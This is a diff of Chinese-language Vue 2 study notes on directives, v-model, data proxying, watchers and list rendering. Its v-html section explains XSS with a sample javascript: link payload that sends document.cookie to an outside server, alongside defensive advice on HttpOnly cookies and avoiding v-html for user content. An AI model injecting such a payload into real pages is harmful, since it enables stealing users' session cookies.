@@ -1,4 +1,4 @@
-### 带学的知识点：
+### 待学的知识点：
 > addRoutes 的使用
 - https://www.cnblogs.com/zhuhuoxingguang/p/11759001.html
 - https://www.jianshu.com/p/27e304884459
@@ -6,6 +6,10 @@
 
 > v-bind 的知识点
 - https://juejin.cn/post/6844904101298323470
+
+
+> 长列表优化
+- https://www.cnblogs.com/mfyngu/p/13675004.html
 
 
 
@@ -63,10 +67,10 @@
 
 
 > 首先创建 Vue 的实例对象, 并传递了一个配置对象作为参数
-    let app = new Vue({ })
+    let app = new Vue({ 配置对象 })
 
 
-> 对象(参数) 中的参数
+> 配置对象中的配置项
     let app = new Vue({
         el:'id'          // element: 选择器 -- vue管理的区域
         data: { }        // 数据
@@ -76,7 +80,7 @@
 - data 属性: 该属性中通常定义一些数据(可能是自己定义, 可能是来源于服务器加载)
 
 
-> 将 Vue 对象中 data 属性里的数据显示在 html 结构中
+> 将 Vue对象 中 data 属性里的数据显示在 html 结构中
     {{变量名}}
 
 <!--
@@ -86,10 +90,10 @@
 
 
 > 我们看个小例子:
+
     <div id="app">
       {{message}}
     </div>
-
 <!--
     实例化Vue的实例 const app = new Vue(), 在创建Vue实例的时候, 我们往里面传递了一个对象{ }
     这个对象可以有一个参数用于挂载我们的元素, 这个元素我们指定了一个id <div id="app"></div>
@@ -97,13 +101,12 @@
 
      const app = new Vue({
 
-<!--
-    通过id, 让Vue管理一下这个div, 相当于把页面中的ID为app的div传递给了Vue的实例
-    当我们传递给Vue实例的时候, 我们的Vue就会负责帮助我们管理它
- -->
-      el:'#app',      // 用于挂载要管理的元素
-      data: {         // 定义数据
-          message:'你好的 Sam 以后会好的'
+      el:'#app', 
+          - 通过id, 让Vue管理一下这个div, 相当于把页面中的ID为app的div传递给了Vue的实例
+          - 当我们传递给Vue实例的时候, 我们的Vue就会负责帮助我们管理它
+
+      data: {
+          message:'Sam要更加的努力和加油哦'
       }
     })
 
@@ -116,8 +119,8 @@
 > v-model
 <!-- 
     <div id="app">
-        <input type="text" v-model='username'>
-        <h3>hello, {{username}}</h3>
+      <input type="text" v-model='username'>
+      <h3>hello, {{username}}</h3>
     </div>
 
     // 创建vue实例
@@ -136,26 +139,22 @@
 - 需求:
 - 数据列表, 我们现在从服务器请求过来一个列表, 希望展示到 HTML 中
 
-- HTML 代码中, 使用 v-for 指令
-
-- 这种模式是响应式的 比如我们要往数据里面追加元素的时候, vue 会自己创建新的 li 来装新的数据
+- HTML模板中, 使用 v-for 指令
+- 这种模式是响应式的 比如我们要往数据里面追加元素的时候, vue 会自己创建新的 li 来更新页面
 
 <div id="app">
-    <ul>
-        <!-- 在这里我们使用v-for来遍历我们传递进来的列表 vue会自动解析html中的语法, 所以v-for之所以有意义是因为vue赋予了它意义 -->
-        <!-- Vue会自动帮我们创建4个li, 每个li中的元素是不一样的 -->
-        <li v-for='item in movies'>{{item}}</li>
-    </ul>
+  <ul>
+    <!-- 在这里我们使用v-for来遍历我们传递进来的列表 vue会自动解析html中的语法, 所以v-for之所以有意义是因为vue赋予了它意义 -->
+    <!-- Vue会自动帮我们创建4个li, 每个li中的元素是不一样的 -->
+    <li v-for='item in movies'>{{item}}</li>
+  </ul>
 </div>
 
 const app = new Vue({
-el:'#app',
-data: {
-
-<!-- 因为是一个列表所以最好是一个数组 -->
-      movies:['海王', '星际穿越', '大话西游', '少年派', '盗梦空间']
-    }
-
+  el:'#app',
+  data: {
+    movies:['海王', '星际穿越', '大话西游', '少年派', '盗梦空间']
+  }
 })
 
 --------------------------
@@ -165,20 +164,25 @@ data: {
 - 点击+ 计数器+1
 - 点击- 计数器-1
 
-- 新的属性: methods 属性: 该属性用于在 vue 对象中定义方法
-- 新的指令: @click: 该指令用于监听某个元素的点击事件, 并且需要指定当发生点击时, 执行的方法(通常是 methods 中定义的方法)
+- 新的配置项: 
+  - methods配置项: 该配置项用于在 vue 对象中定义方法
+
+- 新的指令: 
+  - @click: 该指令用于监听某个元素的点击事件, 并且需要指定当发生点击时, 执行的方法(通常是 methods 中定义的方法)
 <!--
     @click 是 v-on的语法糖
  -->
 
 <div id="app">
-    <h3><span>当前计数:{{counter}}</span></h3>
+  <h3>
+    <span>当前计数:{{counter}}</span>
+  </h3>
+
 <!-- 
     如果代码比较少的话可以在这里面写上counter++
     <button v-on:click='counter--'>-</button>
     <button v-on:click='counter++'>+</button> 
--->
-<!-- 
+
     如果逻辑比较多的时候, 要写在Vue对象的methods中定义
 -->
     <button v-on:click='sub'>-</button>
@@ -187,45 +191,36 @@ data: {
 
 <!-- 声明Vue对象 -->
 const app = new Vue({
+  el:'#app',
+      - 这里并不是绑定给一个单独的元素, 而是绑定给了一个区域 这个区域内都可以被解析
+  data:{
+    counter:0,
+      - 这里定义了一些数据
+  },
+  methods: {
+    - 这里定义了方法 
 
-<!--
-    这里并不是绑定给一个单独的元素, 而是绑定给了一个区域 这个区域内都可以被解析
--->
-    el:'#app',
+    add:function() {
+      // counter++;
+      - 在这里找不到counter 它会去全局里面找
 
-<!-- 这里定义了一些数据 -->
-    data:{
-        counter:0,
-    },
+      this.counter++;
+      - 但是我们整体的代码都是在app内部或者说是new Vue({对象内部})
+      - 所以当我们想取这个对象里的counter变量的话 this.counter 我们要加上this this表示当前对象
+  },
 
-<!-- 这里定义了方法 -->
-    methods: {
-        add:function() {
-
-<!--
-    在这里找不到counter 它会去全局里面找
-
-    但是我们整体的代码都是在app内部或者说是new Vue({对象内部})
-
-    所以当我们想取这个对象里的counter变量的话 this.counter 我们要加上this this表示当前对象
- -->
-        // counter++;
-        this.counter++;
-        },
-
-        sub:function() {
-            this.counter--;
-        }
+    sub:function() {
+      this.counter--;
     }
+  }
 })
 
 > 对 ↑ 总结:
 - 我们在被管理的区域使用插入语法 {{counter}} 这样在 vue 对象里改变该变量的值, 会在文本中自动展示
-
 - 我们把方法定义在了 methods 属性中
--
 
-### 语法糖的意思是简写
+
+> 语法糖的意思是简写
 - 就是正式的语法写起来太麻烦了, 给你有点甜头的写法
 
 --------------------------
@@ -316,7 +311,6 @@ https://vuejs.org/js/vue.min.js
 
 ### Vue的使用 引入JS版
 - 跟jQ的使用方式一样，通过script标签引入Vue文件 引入后全局会多了一个Vue全局对象
-
 - 我们在引入 Vue.js 的时候如果是开发版本 控制台会输出警告 如果不希望有警告的话我们可以使用 Vue.config 来进行配置
 
 
@@ -327,6 +321,8 @@ https://vuejs.org/js/vue.min.js
 - 属性：
     - productionTip   Boolean 默认值 true
       设置为 false 以阻止vue在启动时生成生产提示
+
+- Vue.config.productionTip = false
 
 --------------------------
 
@@ -348,7 +344,7 @@ https://vuejs.org/js/vue.min.js
   })
  -->
 
-> Vue实例：el
+> 配置项: el
 - 通过该配置项指定Vue管理的实例，值通常为css选择器字符串
 <!-- 
   new Vue({
@@ -356,8 +352,9 @@ https://vuejs.org/js/vue.min.js
     el: document.querySelector('#root')
  -->
 
-> Vue实例：data
+> 配置项: data
 - data中用于存储数据 数据供el所指定的容器去使用
+
 - 类型: object | function
 <!-- 在组件当中 data 必须是一个函数 -->
 
@@ -367,15 +364,18 @@ https://vuejs.org/js/vue.min.js
   直接会在 this 上 也就是展开组件直接能看到data中的数据
  -->
 
-- 只有配置在data中的数据 才会做数据代理 和 数据劫持
+**只有配置在data中的数据 才会做数据代理 和 数据劫持**
 - data中的数据发生变化 模板就会重新解析 用到data中的数据的地方就会被重新执行
 
 
-> Vue实例：methods
+> 配置项: methods
 - 配置在这里面的方法要么是回调 要么放在生命周期里面调用
 
-- 标签中的数据可以通过实参传递进来
-- 类型: {[key]:function}
+- 传参：
+- html模板中在调用方法的时候可以将数据通过实参的形式传递给 methods 中的方法
+- 类型: 
+  {[key]:function}
+
 - 作用: 定义属于 Vue 的一些方法, 可以在其他地方调用, 也可以在指令中使用
 
 <!--
@@ -387,7 +387,7 @@ https://vuejs.org/js/vue.min.js
 **注意：一旦data中的数据发生改变 界面里的用到该数据的地方也会发生改变**
 
 
-> Vue实例：template
+> 配置项: template
 - 我们都是在 div#root里面写模板 其实这个区域可以不写任何东西
 <!-- 
   <div id="root">
@@ -396,9 +396,7 @@ https://vuejs.org/js/vue.min.js
   </div>
 
 
-  <div id="root">
-
-  </div>
+  <div id="root"> </div>
  -->
 
 - 我们可以传入 template配置项 在里面写 模板的部分 vue在解析的时候会解析template中传入的模板 template的值是一个字符串
@@ -419,24 +417,25 @@ https://vuejs.org/js/vue.min.js
  -->
 
 
-> Vue实例：watch
-> Vue实例：computed
-> Vue实例：filters
-> Vue实例：directives
+> 配置项: watch
+> 配置项: computed
+> 配置项: filters
+> 配置项: directives
 
-> Vue实例：components
+> 配置项: components
 - 用于注册局部组件 类型是对象
 <!-- 
   components: {
-    组件的名字： 创建组件时的变量名   
-              // 这才是给组件起名字 创建组件时的变量名用于找到我们定义的组件
+    组件的名字： 引用组件的变量
+      // 这才是给组件起名字 创建组件时的变量名用于找到我们定义的组件
   }
  -->
 
 --------------------------
 
-### el 和 data 的两种方式
-> el的代替方式：
+### el 和 data 的另一种表现方式
+
+> el的代替方式：  --  $mount
 - 我们使用Vue原型对象上的方法 $mount 来挂载容器
 <!-- 
   let vm = new Vue({
@@ -444,15 +443,18 @@ https://vuejs.org/js/vue.min.js
       name: 'sam'
     }
   })
-
   vm.$mount('#root')
+
+  new Vue({}).$mount('#root')
  -->
 
 
-> data的代替方式
+> data的代替方式  -- 函数式
 - 上面我们一直使用的data对象式写法 它也可以写成函数式 函数内部必须return 一个对象
+- 数据在对象中进行定义
 - 函数
 <!-- 
+  // 第一种
   data: {}
 
   // 第二种
@@ -473,7 +475,7 @@ https://vuejs.org/js/vue.min.js
 
 ### 模板语法
 - 插值的相关操作都是把变量放入文本中显示 
-- 所有写表达式的地方 vm 身上的所有东西都可以写
+- 所有写表达式的地方 vm 身上的所有东西都可以看到拿来直接调用
 
 - 模板中的{{ }}中可以直接使用vm身上的属性和方法不用加this，同时模板中出现的属性和方法也只会去vm中查找 按着原型链
 <!-- 
@@ -526,13 +528,15 @@ https://vuejs.org/js/vue.min.js
 
 ### 指令语法
 - 往往用于解析标签属性(包括 标签属性 标签体内容 绑定事件)
+- 指令语法一般书写于变迁属性里面
 
 > v-once
 - 该指令后面不需要跟任何表达式
 - 该指令表示元素和组件只会渲染一次, 不会随着数据的改变而改变(不会因为改变 data 里面的数据, 响应到 dom 中)
 <!--
-  在某些情况下, 我们可能不希望界面随意的跟随改变, 
-  这个时候我们就可以使用这个指令
+  - 应用场景
+    在某些情况下, 我们可能不希望界面随意的跟随改变, 
+    这个时候我们就可以使用这个指令
 -->
 
 - v-once所在节点在初次动态渲染后 就视为静态内容了
@@ -543,77 +547,66 @@ https://vuejs.org/js/vue.min.js
   后续修改message里面的值 页面中显示的还是第一次的值
  -->
 
-- 工作中的应用场景
-- 有的时候 只想让这个功能实现一次 我们就使用了once 但是如果发生了网络错误之类的现象 用户点击了一次之后不能再次点击了 体验不好 这是后我们就搭配上了 try catch
-<!-- 
-  try {
-
-  } catch() { 在这里再次的绑定了once事件 }
- -->
-
 
 > v-html
-- 它和v-text很想 唯一的区别就是 当它对应的值中含有标签的时候 v-html会对标签进行解析
+- 渲染文本到标签体中 如果文本中含有标签的时候 v-html会对标签进行解析
 - 该指令后面往往会跟上一个 string 类型, 会将 string 的 html 解析出来并且进行渲染
 <!--
-  <h2 v-html='message'></h2>    // 结果：hello
+  <h2 v-html='message'></h2>    // 结果: 标题类型的hello
 
   data: {
-    message:'<div>hello</div>',
+    message:'<h1>hello</h1>',
   }
 -->
+
+----------------
 
 > xss攻击
 - v-html有安全性的问题
 - 在网站上动态渲染任意html是非常危险的 容易导致xss攻击
 **一定要在可信的内容上使用v-html 永远不要用在用户提交的内容上**
 
-<!-- 
-  // XSS攻击
 
-  // 先铺垫两个知识点：
+> 扩展 XSS攻击
+<!-- 
+  - 先铺垫两个知识点：
   1.
   document.cookie   // 可以拿到当前网站上所有的cookie
 
   2. 
   <a href=javascript:location.href="坏人准备干坏事的网站">
       // a标签内容还可以这么写代码
+-->
 
-  说说什么是xss攻击，我们在登录一个网站的时候 如果成功登录后 目标服务器会返回给客户端cookie存储在用户的浏览器里面
+- 什么是xss攻击? 
+- 我们在登录一个网站的时候 如果成功登录后 目标服务器会返回给客户端cookie存储在用户的浏览器里面
+- 每一个网站发送过来的cookie都是以网站为单位存储的 该cookie就相当于用户在目标网站的身份证 有了cookie甚至可以免登录
+- 假如我们弄丢了cookie 被别人拿到 那么这个人就可以导入我们的cookie伪装成我们免密登录目标网站
 
-  每一个网站发送过来的cookie都是以网站为单位存储的
-  该cookie就相当于用户在目标网站的身份证 有了cookie甚至可以免登录
-
-  假如我们弄丢了cookie 被别人拿到 那么这个人就可以导入我们的cookie伪装成我们免密登录目标网站
-
-
-  那什么场景下会被坏人利用这点呢
-  比如 百度贴吧 我们用户可以发送留言 发送的留言都会保存在数据库中 然后程序员拿到数据后通过遍历 动态的渲染到页面结构里
-
-
+- 作案场景
+- 比如 百度贴吧 我们用户可以发送留言 发送的留言都会保存在数据库中 然后程序员拿到数据后通过遍历 动态的渲染到页面结构里
+<!-- 
   假如 有坏人 以下面的方式 留言
   <a 
-  href=javascript:location.href="http://www.baidu.com?document.cookie"
-  >有妞</a>
-      // 该段代码意思是 带着当前正在浏览的网站上的所有cookie访问坏人的服务器并将cookie传递给坏人的服务器
+    href=javascript:location.href="http://www.baidu.com?document.cookie">
+  有妞</a>
 
+  该段代码意思是 带着当前正在浏览的网站上的所有cookie访问坏人的服务器并将cookie传递给坏人的服务器
   假如 我们程序员 整好 使用v-html来根据留言数据 渲染页面就会造成 这段代码被解析成一个标签 
-
   如果有人点击后 后果不堪设想
-
-
-
-  当然cookie也有验证 需要在后端设置 给敏感数据 比如cookie设置 HttpOnly 这样只有浏览器才能读取cookie并携带cookie其它人都不可以
-
-  document.cookie也不能读取cookie 为空
  -->
 
+- 解决方案
+- 当然cookie也有验证 需要在后端设置 给敏感数据 比如cookie设置 HttpOnly 这样只有浏览器才能读取cookie并携带cookie其它人都不可以
+- document.cookie也不能读取cookie 为空
+ 
+----------------
 
 > v-text 
-- 向其所在的标签插入文本 插入内部再标签属性中完成 标签体内容为空
-- 如果 v-text对应的 值里有标签体类型的文本 它不会解析成标签 只是当字符串来解析
+- 向其所在的标签插入文本
+- 如果 v-text 对应的值里有标签体类型的文本 它不会解析成标签 只是当字符串来解析
 <!-- 
-  <h2 v-text='message'></h2>    // 结果：<div>hello</div>
+  <h2 v-text='message'></h2>    // 结果： <div>hello</div>
 
   data: {
     message:'<div>hello</div>',
@@ -641,7 +634,7 @@ https://vuejs.org/js/vue.min.js
 
 > v-pre
 - v-pre 用于跳过这个元素和它子元素的编译过程
-- 可以利用它跳过 没有使用指令语法 没有使用插值语法的节点 会加快编译
+- 可以利用它跳过 没有使用插值语法的节点 会加快编译
 <!-- 
   一般我们都会给 没有vue语法的节点加v-pre 这样vue就不用分析该节点了 跳过了编译过程
  -->
@@ -675,7 +668,7 @@ https://vuejs.org/js/vue.min.js
   }
  -->
 
-
+- js阻塞
 - js基础的时候我们就了解过js阻塞的概念
 <!-- 
   js    这里我要是加载一个js文件 要花费 5s 的时间
@@ -716,27 +709,31 @@ https://vuejs.org/js/vue.min.js
     })
  -->
 
---------------------------
 
-### 自定义指令
+> 自定义指令 -- directives配置项
 - 上面介绍的都是vue帮我们写好的指令我们都是直接拿过来使用的 也就是内置指令
 - 内置指令的背后也是在用操作dom的方式 也就是说 自定义指令是对原生操作dom的方式进行的封装
+
+- 要点
+- 1. 自定义属性是通过 el 操作dom节点的一系列操作
+- 2. 自定义属性也是响应式的 绑定的数据发生变化 页面也会跟着发生变化
 
 - 需求：
 - 定义一个 v-big指令   效果和v-text类似 但可以把绑定的数值放大10倍
 - 定义一个 v-fbind指令 效果和v-bind类似 但可以让其所绑定的input元素默认获取焦点
 
+
 > 使用 Vue实例中的 配置项 directives : { }
 - 配置自定义指令 v-big
 - 在 directives 里面配置的时候 直接写 big 
 - 在模版中使用的时候再加 v-
+
+- big的配置有两种书写方式 对象 和 函数 
+- 对象的优势在于可以处理细节上的东西
 <!-- 
   directives: { big: { } },
   directives: { big() { } }
  -->
-
-- big的配置有两种书写方式 对象 和 函数 
-- 对象的优势在于可以处理细节上的东西
 
 - 所谓的自定义指令就是一个函数 由vue帮我们调用
 <!-- 
@@ -783,9 +780,9 @@ https://vuejs.org/js/vue.min.js
   binding： v-big 所绑定的标签对象 内部有很多的属性
 
   binding.value：
-           就是标签属性中在使用 v-big 时传递进来的数据
+           就是标签属性中在使用 v-big 时传递进来的数据(该数据可能在data配置项中)
   <!-- 
-    binding.value == v-big='number'中的number == 50
+    binding.value == v-big='number'中的number == data配置项只能够的 50
 
     data() {
       return {
@@ -891,7 +888,7 @@ directives: {
  -->
 
 
-> 自定义指令的坑
+> 自定义指令的注意点
 - 1. 自定义指令的名字 不要使用驼峰命名法 多个单词之间使用-来连接
 - 同时 变量名里面如果使用了 - 我们就要使用引号将它括起来
 <!-- 
@@ -903,7 +900,9 @@ directives: {
 <!-- 
   我打印了一下 
   函数式的自定义指令中的this是undefined
-  对象式的自定义指令中的this式
+  对象式的自定义指令中的this
+
+  20211215 - 额 为什么我现在打印的都是undefined
  -->
 
 - 3. 我们在directives配置的指令都属于局部指令其它的地方用不了
@@ -911,6 +910,7 @@ directives: {
 
 > 全局配置 自定义指令
 - 如果是函数式的自定义指令 第二个参数就是一个function() {}
+
 > Vue.directive('指令名', {指令的配置对象})
 <!-- 
   Vue.directive('fbind', {
@@ -939,6 +939,12 @@ directives: {
 - 主要使用来捕获用户的输入 影响data中的数据的变化
 - 数据不仅能从data流向页面 还可以从页面流向data
 
+- 在原生的js中当我们要收集表单数据的时候
+- 1. 要么使用js挨个获取
+- 2. 要么使用formData表单对象来获取
+
+- 在vue中可以很便利的通过 v-model 来收集用户在表单上输入的数据
+
 - 常用的表单类的元素
   - input
   - radio 
@@ -959,11 +965,12 @@ directives: {
 
   // 简写形式
   <input type="text" v-model='title'>
+      - 将用户在这个表单项上的输入 保存到data配置项中的title变量里面
  -->
 
 
 ### v-model 表单绑定(双向绑定)
-- v-model在给变量赋值的时候 赋值的类型都是string类型
+- v-model在给变量赋值的时候 *赋值的类型都是string类型*
 
 - 与表单配合使用的
 - 也可以用于textarea元素
@@ -980,8 +987,9 @@ directives: {
 <!-- 
   <input type="text" v-model='message'>
 
-  这样就实现了双向绑定, 它会把data中的message中的信息, 作为input的value的值
-  这样data里面的message就绑定在了input中面了
+  这样就实现了双向绑定, 
+  - 1. 它会把data中的message中的信息, 作为input的value的值 显示在input中
+  - 2. 用户在input中的输入也会保存在data配置项中的message里面
  -->
 
 > 双向绑定:
@@ -1015,7 +1023,7 @@ directives: {
 
 > 具体操作:
 <!-- 
-  1. 首先我们把message绑定到input里面
+  1. 首先我们把message绑定到input里面 使用 v-bind:value
   <input type='text' v-bind:value='message'>
 
   2. 接下来我们修改data中的message 也就是实时获取到input中的value的值 赋值给message
@@ -1045,6 +1053,13 @@ directives: {
   也就是说 修改子组件中的数据 会同步到父组件身上
  -->
 
+<!-- 
+  当我们在子组件中使用v-model绑定的是一个基本数据类型的数据时 当修改的时候会报错
+
+  当我们再子组件中使用v-model绑定的是一个对象中的属性的时候
+  不会报错 但修改的同时 子组件和父组件中使用这个属性的地方都会发生变化
+ -->
+
 - 2. vue只能浅层次的监视属性改变没有 不能深度监视 当props是一个对象的时候 我们只用v-model绑定props对象里面的一个值 vue是发现不了 但日后可能会出现种种的问题
 <!--
   在中川的项目就会发生这样的现象
@@ -1053,6 +1068,16 @@ directives: {
 
   事实上也不建议这样做 但是中川做的就没问题么？
   v-model="form[n.props]"
+
+  父组件将请求的数据后的数据对象
+        ↘
+        通过props传入子组件
+              ↘
+              子组件使用v-model绑定这个数据对象
+                    ↘
+                    子组件拿着这个数据对象去渲染表单的默认值和发送请求
+
+  因为父组件只是请求数据 将最后的数据对象 交给了子组件 并没有在父组件中使用这个数据对象中的属性 所以没有问题
 -->
 
 --------------------------
@@ -1205,7 +1230,6 @@ directives: {
 - 一般我们都是使用ajax页面无刷新的状态请求数据 或者 发送数据
 
 - 我们点击form标签内部的按钮会后引起默认行为 也就是表单的提交 表单提交后页面会刷新
-
 - form提交的时候 我们可以给form标签绑定submit事件 用于提交数据 同时要注意我们要阻止默认行为
 
 
@@ -1219,7 +1243,6 @@ directives: {
   city: ''
  -->
 
-> 方式1：
 - 将数据整理到一个userInfo的对象中 
 <!-- 
   userInfo: {
@@ -1281,6 +1304,10 @@ directives: {
 
 - 前面我们学习的指令主要作用是将值插入到我们模板的内容中, 但是除了内容需要动态决定外, 某些属性我们也希望动态来绑定
 
+- 作用：
+- 1. 动态绑定属性
+- 2. v-bind=”对象“ 将对象中的属性展开的放在标签属性中
+
 
 > v-bind:'属性' = "表达式"
 > :'属性' = "表达式"
@@ -1329,12 +1356,12 @@ directives: {
  -->
 
 
-> v-bind 动态绑定 class属性   -- 字符串写法
+> v-bind 动态绑定 class属性  --  字符串写法
 > <h2 class='title' :class='mood'></h2>
 - 当动态添加class 和 普通class混合使用的时候 vue的部分不会覆盖掉普通的class部分
 
 - 适用于：
-- 样式的类名不确定 适用于动态指定
+- 样式的类名不确定 适用于动态指定 动态追加class样式
 <!-- 
   <h2 class='title' :class='mood'></h2>
 
@@ -1377,6 +1404,7 @@ directives: {
 
 > v-bind 动态绑定 class属性   -- 对象语法
 > <h2 v-bind:class='classObj'>
+> <h2 v-bind:class='{类名: isShow}'>
 - 适用于：
 - 要绑定的样式 个数确定 名字也确定 要动态的决定用不用
 - 对象的写法适用于 决定改样式显示与否
@@ -1397,6 +1425,10 @@ directives: {
       this.classObj.calss1 = false
     }
   }
+
+
+  写法2
+  <h2 :class='{类名:isShow}'></h2>
  -->
 
 
@@ -1409,7 +1441,7 @@ directives: {
 
 <!-- 
     <div id='app'>
-      <h2 v-bind:class='active:isActive'>{{message}}</h2>
+      <h2 v-bind:class='{active:isActive}'>{{message}}</h2>
       <button v-on:click='btnClick'>Send</button>
     </div>
 
@@ -1536,7 +1568,7 @@ directives: {
 ### Vue中的数据代理
 - 我们在vue中定义的数据都会放在data中，该数据都是通过Object.defineproperty方法添加上去的，添加上的数据都会在vue对象上
 
-- 当我们读取data中的数据的时候 该数据会触发getter，getter从哪获取到数据显示（_data）
+- 当我们读取data中的数据的时候 该数据会触发getter，getter从哪获取到数据来显示（_data）
 - 当我们设置data中的数据的时候 该数据会触发setter，修改getter读至的数据（_data）
 
 > 回顾 Object.defineProperty 方法
@@ -1563,9 +1595,10 @@ directives: {
   - configurable: true / 默认值：false
 
   - get:
-    该方法会在 设置的属性 被读取的时候调用 该函数必须有返回值 返回值为该属性的属性值
+    该方法会在 设置的属性 被读取的时候调用 该函数必须有返回值(return) 返回值为该属性的属性值
   - set:
     该方法会在 设置的属性 被修改的时候调用 该函数会接收到参数 参数为被修改后的值
+    - 参数为 newValue
 
 <!-- 
   对 get 和 set 的理解 
@@ -1657,6 +1690,7 @@ directives: {
 
 
 > Object.defineProperties(目标对象, {配置对象})
+- 配置多个属性
 - 参数2：
   - 配置对象
 <!-- 
@@ -1690,7 +1724,8 @@ directives: {
 
 
 > 数据代理
-- 通过一个对象 代理对另一个对象中属性的操作 （读写）就叫做数据代理
+- 通过一个对象(A) 操作这个对象(A)代理对另一个对象(B)中属性的操作（读写）就叫做数据代理
+- 对象(A)就是代理对象 操作的不是真实对象的本身 而是代理对象
 - 案例：
 <!-- 
   比如 有一个obj 它有一个属性x 假如我要访问x那就是obj.x 改的话就是obj.x赋值就可以了
@@ -2068,8 +2103,10 @@ directives: {
   immediate
   当为false的时候 只有监视的属性发生改变的时候才会执行handler里面的代码
   当为true的时候 监视属性没有发生改变 一上来就会执行一遍handler里面的代码
-
  -->
+
+**注意:**
+- handler函数中 一上来的时候 oldValue为undefined newValue为一上来展示的值
 
 
 > 深度监视
@@ -2146,6 +2183,7 @@ directives: {
 - 监视的属性必须存在 才能进行监视
 - 监视属性的两种写法
   - 1. new Vue时传入watch配置对象
+
   - 2. 通过vm.$watch监视
   - 通过vue实例 调用 $watch方法
     - 参数1 监视谁
@@ -2343,6 +2381,14 @@ directives: {
   <button @click.once='doThis'>点击</button>
 -->
 
+- 实际工作中的应用场景
+- 有的时候 只想让这个功能实现一次 我们就使用了once 但是如果发生了网络错误之类的现象 用户点击了一次之后不能再次点击了 体验不好 这是后我们就搭配上了 try catch
+<!-- 
+  try {
+
+  } catch() { 在这里再次的绑定了once事件 }
+ -->
+
 
 > 使用事件的捕获模式
 - @事件名.capture
@@ -2372,7 +2418,7 @@ directives: {
 
 - 移动端的项目可能会用的比较多一些
 
-**扩展：**
+**扩展： @scroll @wheel**
 - @scroll 是滚动滚动条的时候 会触发事件
 <!-- 
   scroll的特点 当滚动条到底了 再次滚动滚动条的时候不会触发事件了
@@ -2494,8 +2540,9 @@ directives: {
 ### v-if, v-else-if, v-else
 - 这三个指令与js的条件语句if else else if类似
 - vue的条件指令可以根据表达式的值 在dom中渲染或销毁元素 或 组件
+
 - 注意：
-- dom的结构会根据v-if的结果 销毁 和 创建
+- dom的结构会根据v-if的结果 销毁 和 创建 反复执行这两个过程
 
 - 应用场景:
 - 当满足条件的时候 我才希望元素渲染在dom结构中 不满足条件的时候 不希望它渲染出来
@@ -2583,8 +2630,10 @@ directives: {
 ### <template> 和 v-if 的配合使用
 - 它不会影响结构 当页面最终渲染的时候 vue会将 template 标签脱掉 
 - 优点：不会破坏页面的html结构
+
 - 注意：
-- 它只能配合 v-if 的使用
+- 它只能配合 v-if 的使用 也可以和 v-for 配合使用
+- 同时v-for的逻辑 要比 v-if的优先级高
 <!-- 
   需求 当 n = 1 的时候展示下面的 h2
 
@@ -2616,7 +2665,7 @@ directives: {
 - 需求:
 - 用户在登录的时候, 可以切换使用 用户账号登录 还是 邮箱地址登录
 
-  用户账号: | 用户账号    |  | 切换类型 |
+  用户账号: | 用户账号 |  | 切换类型 |
 
 <!-- 
   <div id="app">
@@ -2626,14 +2675,14 @@ directives: {
       <label for="username">
         用户账号:
       </label>
-      <input type="text" placeholder='用户账号' id='username' key='username-input'>
+      <input type="text" placeholder='用户账号' id='username' key='username-input'>     // 注意这里增加了key值
     </span>
 
     <span v-else>
       <label for="email">
         用户邮箱:
       </label>
-      <input type="text" placeholder='用户邮箱'  id='email' key='email-input'>
+      <input type="text" placeholder='用户邮箱'  id='email' key='email-input'>        // 注意这里增加了key值
     </span>
     
     <button @click='isUser=!isUser'>切换类型</button>
@@ -2646,6 +2695,12 @@ directives: {
       isUser:true
     }
   })
+
+
+  增加key值的原因
+  输入框内的文本会被vue复用到另一个结构中 所以利用key值来区分 不让它复用
+
+  是不是一般这种情况都出现在文本框类的input中
 -->
 
 ### vue重复利用dom结构的问题
@@ -2748,10 +2803,22 @@ directives: {
  -->
 
 
+**技巧**
+- v-for也可以和配合<template v-for>来渲染一段结构
+- 注意key值的问题
+- key值没有办法加在template上 我们只能加在元素节点上 利用 字符串dd + index 的形式来区分
+<!-- 
+  <template v-for="(item, index) of list">
+    <dd :key="'dd' + index">
+    <dt :key="'dt' + index">
+ -->
+
+--------------------------
+
 ### 列表过滤(模糊搜索)
 - 案例：
 - 需求：
-- 用户输入文字 我们根据文字来过滤列表中的数据 比如我输入马 页面上展示马冬梅 我输入周 页面上展示周冬雨 和 周杰伦
+- 用户输入文字 我们根据文字来过滤列表中的数据 比如我输入"马" 页面上展示马冬梅 我输入"周" 页面上展示周冬雨 和 周杰伦
 <!-- 
 
   <input type="text" v-model='info' placeholder="请输入名字">
@@ -2812,6 +2879,8 @@ directives: {
       this.personsArr = this.persons.filter( item => {
         return item.name.match(info) != null
       })
+
+      this.personsArr = this.persons.filter(item => item.name.indexOf(n) != -1)
     }
   }
  -->
@@ -2900,6 +2969,9 @@ directives: {
     }
   }
  -->
+
+- 要点：
+- 对过滤数组做监视 personsArr
 
 
 **注意：**
@@ -3283,7 +3355,7 @@ directives: {
 
 --------------------------
 
-### vue 监测数组数据改变的原理
+### vue 监测 数组 数据改变的原理
 - 我们上面知道 当我们在new vue的时候在data中的数据都会被添加数据监测后放到_data里面同时对_data中的数据做数据代理放到vm身上
 
 - 那也就是说 每一个在data中的数据都会有一套为之对应的getter和setter
@@ -3364,14 +3436,15 @@ directives: {
 
 ### vue监视数据的原理
 
-- 1. vue会监视data中所有层次的数据
+- 1. vue会监视data中所有层次的数据 
+
 - 2. 如何监测对象中的数据？
   通过setter实现监测 且要在new vue时就传入要监测的数据
   - 1. 对象中后追加的属性 vue默认不做响应式的处理
   - 2. 如需要给后添加的属性做响应式 请使用如下的api
-  Vue.set / vm/this.$set
+       Vue.set / vm/this.$set
 
-- 3. 如何监测数组总的数据？
+- 3. 如何监测数组中的数据？
   通过包裹数组更新元素的方法实现 本质就是做了两件事情
   - 1. 调用原生对应的方法对数组进行更新
   - 2. 重新解析模板 进而更新页面
@@ -3381,12 +3454,13 @@ directives: {
   - 2. Vue.set / vm/this.$set
 
 - 5. 特别注意：
-- Vue.set / vm/this.$set 不能给vm或vm的根数据对象 添加属性
+  - Vue.set / vm/this.$set 不能给vm或vm的根数据对象 添加属性
+  - 只能对对象或数组进行配置
 
 --------------------------
 
 ### 过滤器 filters
-- 过滤器的逻辑我们还可以用methods 和 computed 都能实现
+- 过滤器的逻辑我们还可以用 methods 和 computed 都能实现
 - 过滤器简单的理解为, 将数据 '过滤 / 格式下' 再显示在html结构中
 <!-- 比如时间, 数字, 后端传递过来的数据 -->
 
@@ -3397,13 +3471,13 @@ directives: {
 - 过滤器的第一个参数为 管道符号前面的值
 - 过滤器还可以传递第二个参数
 
-{{value | 过滤器函数}}
+  {{value | 过滤器函数}}
 
